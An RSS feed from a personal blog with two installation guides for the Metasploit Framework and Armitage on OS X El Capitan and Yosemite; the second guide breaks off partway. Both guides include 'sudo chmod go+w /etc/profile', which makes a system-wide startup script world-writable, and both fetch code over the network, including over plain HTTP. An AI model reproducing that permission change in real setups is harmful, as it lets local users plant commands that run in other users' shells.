<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on norsey&#39;s hideout</title>
        <link>https://www.pwnd.red/posts/</link>
        <description>Recent content in Posts on norsey&#39;s hideout</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Thu, 31 Dec 2015 06:32:09 +0000</lastBuildDate>
        <atom:link href="https://www.pwnd.red/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>installing metasploit framework on os x el capitan</title>
            <link>https://www.pwnd.red/posts/installing-metasploit-framework-on-os-x-el-capitan/</link>
            <pubDate>Thu, 31 Dec 2015 06:32:09 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/installing-metasploit-framework-on-os-x-el-capitan/</guid>
            <description>This Guide is adapted from Carlos Perez’s Blog (http://www.darkoperator.com/installing-metasploit-framewor/) (which is a must read) with some additions and fixes to make the setup work on OS X El Capitan.
This post should help to alleviate some common issues with installing ruby and the Metasploit Framework on OS X. The main issues being that OS X ships with it&amp;rsquo;s own versions of Ruby that is not compatible with Metasploit and the version of libiconv installed with OS X causes issues installing the Nokogiri gem.</description>
            <content type="html"><![CDATA[<p>This Guide is adapted from <a href="http://www.darkoperator.com/installing-metasploit-framewor/">Carlos Perez’s Blog</a> (<a href="http://www.darkoperator.com/installing-metasploit-framewor/">http://www.darkoperator.com/installing-metasploit-framewor/</a>) (<em>which is a must read</em>) with some additions and fixes to make the setup work on OS X El Capitan.</p>
<p>This post should help to alleviate some common issues with installing ruby and the Metasploit Framework on OS X. The main issues being that OS X ships with it&rsquo;s own versions of Ruby that is not compatible with Metasploit and the version of <code>libiconv</code> installed with OS X causes issues installing the Nokogiri gem.</p>
<p><!-- raw HTML omitted --></p>
<h1 id="xcode-and-command-line-development-tools">Xcode and Command Line Development Tools</h1>
<p>The first step is to ensure that Software Update has been run and that OS X is updated. Once OS X has been updated, It is time to install Xcode.</p>
<p><a href="https://itunes.apple.com/us/app/xcode/id497799835?mt=12">Mac App Store - Xcode</a></p>
<p>Once Xcode has been installed launch Xcode from Applications and agree to the SDK License Agreement.</p>

    <img src="https://i.imgur.com/72cLFaD.png"  class="left"  />


<p>Install Xcode developer tools  by typing:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">xcode-select --install
</code></pre></div>
    <img src="https://i.imgur.com/U98gNAN.png"  class="left"  />


<p>Click Install in the dialog box that pops up and the package will be installed.</p>

    <img src="https://i.imgur.com/MUAlZjF.png"  class="left"  />



    <img src="https://i.imgur.com/1JJI6Mo.png"  class="left"  />


<p><!-- raw HTML omitted --></p>
<h1 id="java">Java</h1>
<p>Ensure that the latest versions of the <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html">Java 8 JRE and JDK</a> are installed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://download.oracle.com/otn-pub/java/jdk/8u65-b17/jdk-8u65-macosx-x64.dmg
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://download.oracle.com/otn-pub/java/jdk/8u65-b17/jre-8u65-macosx-x64.dmg
</code></pre></div>
    <img src="https://i.imgur.com/sHOfg8r.png"  class="left"  />


<p><!-- raw HTML omitted --></p>
<h1 id="homebrew">Homebrew</h1>
<p>Install homebrew by running the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ruby -e <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</code></pre></div><p>Once Homebrew installs, run <code>brew doctor</code> to finalize the installation of homebrew.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew doctor
</code></pre></div><p>Once homebrew is installed and set up, the <code>PATH</code> needs to be updated to ensure that all homebrew binaries are executed correctly.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo PATH<span style="color:#f92672">=</span>/usr/local/bin:/usr/local/sbin:$PATH &gt;&gt; ~/.bash_profile
</code></pre></div><p>Once this is done, load the new <code>$PATH</code> by sourcing it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">source ~/.bash_profile
</code></pre></div><p>From here we need to ensure that both versions and dupes are loaded into homebrew (We load in dupes for later, as a dependency for nokogiri is located in here.)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew tap homebrew/versions
brew tap homebrew/dupes
</code></pre></div><p><!-- raw HTML omitted --></p>
<h1 id="homebrew-installs">Homebrew Installs</h1>
<p>Before Metasploit can be installed, some more dependencies should be installed via homebrew.</p>
<p><!-- raw HTML omitted --></p>
<h2 id="nmap">Nmap</h2>
<p>This can be installed either via the dmg from their site, or via homebrew. Homebrew tends to keep their packages updated and it is quite easy to install and manage.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew install nmap
</code></pre></div><p><!-- raw HTML omitted --></p>
<h2 id="install-ruby-218">Install Ruby 2.1.8</h2>
<p>Now time for the part the most frequently causes issues. Ruby 2.1.7 is recommended as seen in <a href="https://github.com/rapid7/metasploit-framework/blob/master/.ruby-version">this</a> file. Since Homebrew doesn&rsquo;t have 2.1.7 as an option, we&rsquo;re going to take whatever 2.1.x it can give us. At the time of writing this, the version pulled was 2.1.8 which works perfectly for us.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew install homebrew/versions/ruby21
</code></pre></div><p>Now, the most important part of the ruby installation&hellip;ensuring that the ruby version you are running is in fact <code>2.1.8</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ruby –v
</code></pre></div><p>If the version of ruby is not version 2.1.8, check which ruby binary is being run by default.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">which ruby
</code></pre></div><p>If the binary being run is not the one from the <code>usr/local/Cellar/ruby21/2.1.8/bin/</code> directory, then you will need to modify the <code>~/.bash_profile</code> file to adjust your path.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nano ~/.bash_profile
</code></pre></div>
    <img src="https://i.imgur.com/Rh6LC1C.png"  class="left"  />


<p><!-- raw HTML omitted --></p>
<h2 id="installing-and-configuring-postgresql">Installing and configuring PostgreSQL</h2>
<p>Now, time to install the backend database that Metasploit uses.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew install postgresql --without-ossp-uuid
</code></pre></div>
    <img src="https://i.imgur.com/GXaTSYn.png"  class="left"  />


<p>If the Homebrew install did NOT complete this for you, the next step is to initialize the database for first time usage.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">initdb /usr/local/var/postgres
</code></pre></div><blockquote>
<p><em>As of 9.3.5_1 it looks like the homebrew installer wraps up by running this command for you.</em></p>
</blockquote>
<p>Ensure that PostgreSQL is set to launch on boot by issuing the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">mkdir -p ~/Library/LaunchAgents
cp /usr/local/Cellar/postgresql/9.4.5_2/homebrew.mxcl.postgresql.plist ~/Library/LaunchAgents/
</code></pre></div><p>Start the PostgreSQL service:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">launchctl load -w ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist
</code></pre></div><p>Create a new user <code>msf</code> and a database <code>msf</code> with the user <code>msf</code> as the owner.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">createuser msf -P -h localhost
createdb -O msf msf -h localhost
</code></pre></div><p><strong>Remember this password as it will be used when configuring Metasploit</strong></p>
<p><!-- raw HTML omitted --></p>
<h2 id="configuring-vncviewer">Configuring VNCViewer</h2>
<p>As Metasploit uses vncviewer for its VNC payloads, and OS X comes with a VNC client, we need to create the needed vncviewer file that will call the OS X vnc viewer.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo <span style="color:#e6db74">&#39;#!/usr/bin/env bash&#39;</span>&gt;&gt; /usr/local/bin/vncviewer
echo open vnc://<span style="color:#ae81ff">\$</span><span style="color:#ae81ff">1</span> &gt;&gt; /usr/local/bin/vncviewer
chmod +x /usr/local/bin/vncviewer
</code></pre></div><p><!-- raw HTML omitted --></p>
<h1 id="installing-metasploit-framework">Installing Metasploit Framework</h1>
<p>Installing the following gems needed for running the framework:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">gem install pg sqlite3 msgpack activerecord redcarpet rspec simplecov yard bundler
</code></pre></div><p>Download the framework and prepare the directories:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cd /usr/local/share/
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
<span style="color:#66d9ef">for</span> MSF in <span style="color:#66d9ef">$(</span>ls msf*<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> ln -s /usr/local/share/metasploit-framework/$MSF /usr/local/bin/$MSF;<span style="color:#66d9ef">done</span>
sudo chmod go+w /etc/profile
sudo echo export MSF_DATABASE_CONFIG<span style="color:#f92672">=</span>/usr/local/share/metasploit-framework/config/database.yml &gt;&gt; /etc/profile
</code></pre></div><p>Using brew and bundler the properly supported gems need to be installed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">bundle install
</code></pre></div><p><strong>NOTE: Bundler $PATH seems to be screwed at the moment. If bundler is not in your $PATH try running it from the installed location:</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ find /usr/local/lib/ruby -type f -name bundle
/usr/local/lib/ruby/gems/2.1.0/bin/bundle
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ /usr/local/lib/ruby/gems/2.1.0/bin/bundle install
</code></pre></div>
    <img src="https://i.imgur.com/8FZNMKl.png"  class="left"  />


<p>Now that the framework has been installed, and proper bundles installed. The database connection needs to be configured.</p>
<p>Save the following into <code>/usr/local/share/metasploit-framework/config/database.yml</code> replace <code>&lt;password&gt;</code> with the msf user&rsquo;s password you set earlier.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">vi /usr/local/share/metasploit-framework/config/database.yml
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ae81ff">production:&lt;br /&gt;</span>
  <span style="color:#f92672">adapter</span>: <span style="color:#ae81ff">postgresql</span>
  <span style="color:#f92672">database</span>: <span style="color:#ae81ff">msf</span>
  <span style="color:#f92672">username</span>: <span style="color:#ae81ff">msf</span>
  <span style="color:#f92672">password</span>: <span style="color:#ae81ff">&lt;password&gt;</span>
  <span style="color:#f92672">host</span>: <span style="color:#ae81ff">127.0.0.1</span>
  <span style="color:#f92672">port</span>: <span style="color:#ae81ff">5432</span>
  <span style="color:#f92672">pool</span>: <span style="color:#ae81ff">75</span>
  <span style="color:#f92672">timeout</span>: <span style="color:#ae81ff">5</span>
</code></pre></div><p>Now that this file has been created, source <code>bash_profile</code> to load the variables for the database.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">source /etc/profile
source ~/.bash_profile
</code></pre></div><p>Now, to start Metasploit Framework as YOUR USER to it initializes the schema for the database for the first time as a NON ROOT user. Run this from within the <code>/usr/local/share/metasploit-framework</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./msfconsole
</code></pre></div><p>Once the console loads, ensure that the database is connected by issuing:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">msf&gt; db_status
</code></pre></div><p>it should return:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&gt; [*] postgresql connected to msf
</code></pre></div>
    <img src="https://i.imgur.com/69nZpTw.png"  class="left"  />


<p><!-- raw HTML omitted --></p>
<h1 id="installing-armitage">Installing Armitage</h1>
<p>Execute the following commands to prepare the environment and download armitage to the correct location:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew install pidof
curl -# -o /tmp/armitage.tgz http://www.fastandeasyhacking.com/download/armitage-latest.tgz
tar -xvzf /tmp/armitage.tgz -C /usr/local/share
bash -c <span style="color:#e6db74">&#34;echo \&#39;/usr/bin/java\&#39; -jar /usr/local/share/armitage/armitage.jar \$\*&#34;</span> &gt; /usr/local/share/armitage/armitage
perl -pi -e <span style="color:#e6db74">&#39;s/armitage.jar/\/usr\/local\/share\/armitage\/armitage.jar/g&#39;</span> /usr/local/share/armitage/teamserver
</code></pre></div>
    <img src="https://i.imgur.com/KxX4rva.png"  class="left"  />


<p>Lastly, create <code>sym</code> links for Armitage:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ln -s /usr/local/share/armitage/armitage /usr/local/bin/armitage
ln -s /usr/local/armitage/teamserver /usr/local/bin/teamserver
</code></pre></div><p>Due to the way variables are handled when using <code>sudo</code>, you will need to give the <code>–E</code> option.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo –E armitage
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo –E msfconsole
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>installing metasploit framework on os x yosemite (updated april 2015)</title>
            <link>https://www.pwnd.red/posts/installing-metasploit-framework-on-os-x-yosemite/</link>
            <pubDate>Mon, 03 Nov 2014 13:48:22 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/installing-metasploit-framework-on-os-x-yosemite/</guid>
            <description>EDIT: The installation guide for OSX El Capitan can be found here
This Guide is adapted from Carlos Perez’s Blog (http://www.darkoperator.com/installing-metasploit-framewor/) (which is a must read) with some additions and fixes to make the setup work on OS X Yosemite.
This post should help to alleviate some common issues with installing ruby and the Metasploit Framework on OS X. The main issues being that OS X ships with it&amp;rsquo;s own versions of Ruby that is not compatible with Metasploit and the version of libiconv installed with OS X causes issues installing the Nokogiri gem.</description>
            <content type="html"><![CDATA[<p>EDIT: The installation guide for OSX El Capitan can be found <a href="/posts/installing-metasploit-framework-on-os-x-el-capitan/">here</a></p>
<p>This Guide is adapted from <a href="http://www.darkoperator.com/installing-metasploit-framewor/">Carlos Perez’s Blog</a> (<a href="http://www.darkoperator.com/installing-metasploit-framewor/">http://www.darkoperator.com/installing-metasploit-framewor/</a>) (<em>which is a must read</em>) with some additions and fixes to make the setup work on OS X Yosemite.</p>
<p>This post should help to alleviate some common issues with installing ruby and the Metasploit Framework on OS X. The main issues being that OS X ships with it&rsquo;s own versions of Ruby that is not compatible with Metasploit and the version of <code>libiconv</code> installed with OS X causes issues installing the Nokogiri gem.</p>
<p><!-- raw HTML omitted --></p>
<h1 id="xcode-and-command-line-development-tools">Xcode and Command Line Development Tools</h1>
<p>The first step is to ensure that Software Update has been run and that OS X is updated. Once OS X has been updated, It is time to install Xcode.</p>
<p><a href="https://itunes.apple.com/us/app/xcode/id497799835?mt=12">Mac App Store - Xcode</a></p>
<p>Once Xcode has been installed launch Xcode from Applications and agree to the SDK License Agreement.</p>

    <img src="https://i.imgur.com/72cLFaD.png"  class="left"  />


<p>Install Xcode developer tools  by typing:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">xcode-select --install
</code></pre></div>
    <img src="https://i.imgur.com/U98gNAN.png"  class="left"  />


<p>Click Install in the dialog box that pops up and the package will be installed.</p>

    <img src="https://i.imgur.com/MUAlZjF.png"  class="left"  />



    <img src="https://i.imgur.com/1JJI6Mo.png"  class="left"  />


<p><!-- raw HTML omitted --></p>
<h1 id="java">Java</h1>
<p>Ensure that the latest versions of the <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html">Java 8 JRE and JDK</a> are installed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://download.oracle.com/otn-pub/java/jdk/8u40-b27/jdk-8u40-macosx-x64.dmg
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://download.oracle.com/otn-pub/java/jdk/8u40-b27/jre-8u40-macosx-x64.dmg
</code></pre></div>
    <img src="https://i.imgur.com/sHOfg8r.png"  class="left"  />


<p><!-- raw HTML omitted --></p>
<h1 id="homebrew">Homebrew</h1>
<p>Install homebrew by running the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ruby -e <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</code></pre></div><p>Once Homebrew installs, run ‘<strong>brew doctor</strong>’ to finalize the installation of homebrew.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew doctor
</code></pre></div><p>Once homebrew is installed and set up, the PATH needs to be updated to ensure that all homebrew binaries are executed correctly.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo PATH<span style="color:#f92672">=</span>/usr/local/bin:/usr/local/sbin:$PATH &gt;&gt; ~/.bash_profile
</code></pre></div><p>Once this is done, load the new $PATH by sourcing it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">source ~/.bash_profile
</code></pre></div><p>From here we need to ensure that both versions and dupes are loaded into homebrew (We load in dupes for later, as a dependency for nokogiri is located in here.)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew tap homebrew/versions
brew tap homebrew/dupes
</code></pre></div><p><!-- raw HTML omitted --></p>
<h1 id="homebrew-installs">Homebrew Installs</h1>
<p>Before Metasploit can be installed, some more dependencies should be installed via homebrew.</p>
<p><!-- raw HTML omitted --></p>
<h2 id="nmap">Nmap</h2>
<p>This can be installed either via the dmg from their site, or via homebrew. Homebrew tends to keep their packages updated and it is quite easy to install and manage.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew install nmap
</code></pre></div><p><!-- raw HTML omitted --></p>
<h2 id="install-ruby-215">Install Ruby 2.1.5</h2>
<p>Now time for the part the most frequently causes issues. Ruby 2.1.5 is recommended as seen in <a href="https://github.com/rapid7/metasploit-framework/blob/master/.ruby-version">this</a> file. Since Homebrew doesn&rsquo;t have 2.1.5 as an option, we&rsquo;re going to take whatever 2.1.x it can give us. At the time of writing this, the version pulled was 2.1.5 which works perfectly for us.</p>
<p><code>brew install homebrew/versions/ruby21</code></p>
<p>Now, the most important part of the ruby installation, Ensuring that the ruby version you are running is in fact 2.1.5.</p>
<p><code>ruby –v</code></p>

    <img src="https://i.imgur.com/b7NfJAr.png"  class="left"  />


<p><!-- raw HTML omitted --></p>
<h2 id="installing-and-configuring-postgresql">Installing and configuring PostgreSQL</h2>
<p>Now, time to install the backend database that Metasploit uses.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew install postgresql --without-ossp-uuid
</code></pre></div>
    <img src="https://i.imgur.com/GXaTSYn.png"  class="left"  />


<p>If the Homebrew install did NOT complete this for you, the next step is to initialize the database for first time usage.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">initdb /usr/local/var/postgres
</code></pre></div><blockquote>
<p><em>As of 9.3.5_1 it looks like the homebrew installer wraps up by running this command for you.</em></p>
</blockquote>
<p>Ensure that postgreSQL is set to launch on boot by issuing the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">mkdir -p ~/Library/LaunchAgents
cp /usr/local/Cellar/postgresql/9.4.1/homebrew.mxcl.postgresql.plist ~/Library/LaunchAgents/
</code></pre></div><p>Start the PostgreSQL service:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">launchctl load -w ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist
</code></pre></div><p>Create a new user msf* and a database msf with the user msf as the owner.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">createuser msf -P -h localhost
createdb -O msf msf -h localhost
</code></pre></div><p><strong>Remember this password as it will be used when configuring Metasploit</strong></p>
<p><!-- raw HTML omitted --></p>
<h1 id="configuring-vncviewer">Configuring VNCViewer</h1>
<p>As Metasploit uses vncviewer for its VNC payloads, and OS X comes with a VNC client, we need to create the needed vncviewer file that will call the OS X vnc viewer.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo <span style="color:#e6db74">&#39;#!/usr/bin/env bash&#39;</span>&gt;&gt; /usr/local/bin/vncviewer
echo open vnc://<span style="color:#ae81ff">\$</span><span style="color:#ae81ff">1</span> &gt;&gt; /usr/local/bin/vncviewer
chmod +x /usr/local/bin/vncviewer
</code></pre></div><p><!-- raw HTML omitted --></p>
<h1 id="installing-metasploit-framework">Installing Metasploit Framework</h1>
<p>Installing the following gems needed for running the framework:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">gem install pg sqlite3 msgpack activerecord redcarpet rspec simplecov yard bundler
</code></pre></div><p>Download the framework and prepare the directories:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cd /usr/local/share/
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
<span style="color:#66d9ef">for</span> MSF in <span style="color:#66d9ef">$(</span>ls msf*<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> ln -s /usr/local/share/metasploit-framework/$MSF /usr/local/bin/$MSF;<span style="color:#66d9ef">done</span>
sudo chmod go+w /etc/profile
sudo echo export MSF_DATABASE_CONFIG<span style="color:#f92672">=</span>/usr/local/share/metasploit-framework/config/database.yml &gt;&gt; /etc/profile
</code></pre></div><p>Using brew and bundler the properly supported gems need to be installed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">bundle install
</code></pre></div>
    <img src="https://i.imgur.com/8FZNMKl.png"  class="left"  />


<p>Now that the framework has been installed, and proper bundles installed. The database connection needs to be configured.</p>
<p>Save the following into <code>/usr/local/share/metasploit-framework/config/database.yml</code> replace <code>&lt;password&gt;</code> with the msf user&rsquo;s password you set earlier.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">vi /usr/local/share/metasploit-framework/config/database.yml
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#f92672">production</span>:
  <span style="color:#f92672">adapter</span>: <span style="color:#ae81ff">postgresql</span>
  <span style="color:#f92672">database</span>: <span style="color:#ae81ff">msf</span>
  <span style="color:#f92672">username</span>: <span style="color:#ae81ff">msf</span>
  <span style="color:#f92672">password</span>: <span style="color:#ae81ff">&lt;password&gt;</span>
  <span style="color:#f92672">host</span>: <span style="color:#ae81ff">127.0.0.1</span>
  <span style="color:#f92672">port</span>: <span style="color:#ae81ff">5432</span>
  <span style="color:#f92672">pool</span>: <span style="color:#ae81ff">75</span>
  <span style="color:#f92672">timeout</span>: <span style="color:#ae81ff">5</span>
</code></pre></div><p>Now that this file has been created, source bash_profile to load the variables for the database.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">source /etc/profile
source ~/.bash_profile
</code></pre></div><p>Now, to start Metasploit Framework as YOUR USER to it initializes the schema for the database for the first time as a NON ROOT user. Run this from within the <code>/usr/local/share/metasploit-framework</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./msfconsole
</code></pre></div><p>Once the console loads, ensure that the database is connected by issuing:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf&gt; db_status
</code></pre></div><p>it should return:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&gt; [*] postgresql connected to msf
</code></pre></div>
    <img src="https://i.imgur.com/69nZpTw.png"  class="left"  />


<p><!-- raw HTML omitted --></p>
<h1 id="installing-armitage">Installing Armitage</h1>
<p>Execute the following commands to prepare the environment and download armitage to the correct location:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew install pidof
curl -# -o /tmp/armitage.tgz http://www.fastandeasyhacking.com/download/armitage-latest.tgz
tar -xvzf /tmp/armitage.tgz -C /usr/local/share
bash -c <span style="color:#e6db74">&#34;echo \&#39;/usr/bin/java\&#39; -jar /usr/local/share/armitage/armitage.jar \$\*&#34;</span> &gt; /usr/local/share/armitage/armitage
perl -pi -e <span style="color:#e6db74">&#39;s/armitage.jar/\/usr\/local\/share\/armitage\/armitage.jar/g&#39;</span> /usr/local/share/armitage/teamserver
</code></pre></div>
    <img src="https://i.imgur.com/KxX4rva.png"  class="left"  />


<p>Lastly, create sym links for Armitage:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ln -s /usr/local/share/armitage/armitage /usr/local/bin/armitage
